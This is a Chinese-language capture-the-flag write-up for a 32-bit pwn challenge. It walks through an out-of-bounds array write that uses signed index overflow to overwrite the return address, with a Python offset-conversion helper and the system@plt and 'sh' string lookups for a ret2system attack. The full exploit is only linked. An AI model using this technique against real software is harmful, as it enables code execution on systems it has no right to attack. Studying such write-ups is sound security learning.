## pwn1 (pwn, 250p)

提供了以下文件：  
[pwn3](./pwn3)

---------------------------------------

### 0x1 分析程序
执行下程序，再用IDA分析下，一时没找到漏洞。
``` c
int sub_80485E7()
{
  int v1; // [sp+10h] [bp-48h]@2
  int v2; // [sp+14h] [bp-44h]@2
  int v3; // [sp+18h] [bp-40h]@6
  int j; // [sp+1Ch] [bp-3Ch]@6
  int i; // [sp+20h] [bp-38h]@1
  int buf[13]; // [sp+24h] [bp-34h]@1

  memset(buf, 0, 40u);
  for ( i = 0; i <= 9; ++i )
  {
    puts("enter index");
    fflush(stdout);
    __isoc99_scanf("%d", &v1);
    puts("enter value");
    fflush(stdout);
    __isoc99_scanf("%d", &v2);
    if ( v1 > 9 )
      exit(0);
    buf[v1] = v2;
  }
  puts("your input");
  v3 = fflush(stdout);
  for ( j = 0; j <= 9; ++j )
  {
    printf("%d ", buf[j]);
    v3 = fflush(stdout);
  }
  return v3;
}
```

下标`v1`的值是输入得来的，只要小于9就可以，那么也可以为负数。但往低地址写数据，这不能覆盖返回地址是没意义的。苦思冥想许久，无意间看了下对应的汇编:
```
.text:08048683                 mov     [ebp+eax*4+buf], edx
```

恩，这是个int数组，偏移是下标乘以4，那么就可能发生整数溢出，将负数变正数。再想想乘以4，其实就是左移2位。那么实际要写的偏移量先右移2位，再把最高位置1（变成负数）就即。这里还要注意一点是程序采用`%d`来读取数字，最大的正整数是2147483647，如果输入的数字比较这个大，那么`v1`还是2147483647。所以我们必须显式输入一个负数。可以采用ctypes.c_int来得到相应的负数形式，如下：

``` python
from ctypes import c_int

def chg(x):
	assert(x & 3 == 0)
	tmp = c_int(0x80000000 | (x >> 2))
	return str(tmp.value)
```	

下面的思路和pwn1基本是一样的，先查看下需要多少个字节才能溢出，在IDA的伪代码中：

```
# buf在栈中的位置
-00000048 v1              dd ?
-00000044 v2              dd ?
-00000040 v3              dd ?
-0000003C j               dd ?
-00000038 i               dd ?
-00000034 buf             dd 13 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```
可以看到56（0x34+4）个字节后将溢出覆盖返回地址。

### 0x2 构造exp
查看可以利用的plt函数
``` 
$ objdump -d -j .plt pwn3
# 下面是回显，省略了部分内容
08048410 <puts@plt>:
 8048410:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048416:	68 10 00 00 00       	push   $0x10
 804841b:	e9 c0 ff ff ff       	jmp    80483e0 <_init+0x24>

08048420 <system@plt>:
 8048420:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048426:	68 18 00 00 00       	push   $0x18
 804842b:	e9 b0 ff ff ff       	jmp    80483e0 <_init+0x24>
```

有了system函数，那再用ROPgadget找下是否有`/bin/sh`或`sh`字符串

``` 
$ ROPgadget --binary pwn3 --string "/bin/sh\0"
Strings information
============================================================

$ ROPgadget --binary pwn3 --string "sh\0"
Strings information
============================================================
0x080482ae : she
```

发现程序里确实有`sh`字符串，那exp也出来了。详细exp内容请看[exp2.py](./exp2.py)

### 0x3 结束语
1. 在比赛时并不知道可以直接用`system（sh）`，所以跟pwn1一样采用了相同的方式得到了`/bin/sh`地址。有兴趣请看[exp.py](./exp.py)
2. 在pwn2中是采用`%u`来读取数字的，不用考虑地址是否大于`0x7fffffff`。而这题中是采用`%d`来读取数字的，如果地址过大，要转换为对应的负数形式来进行输入。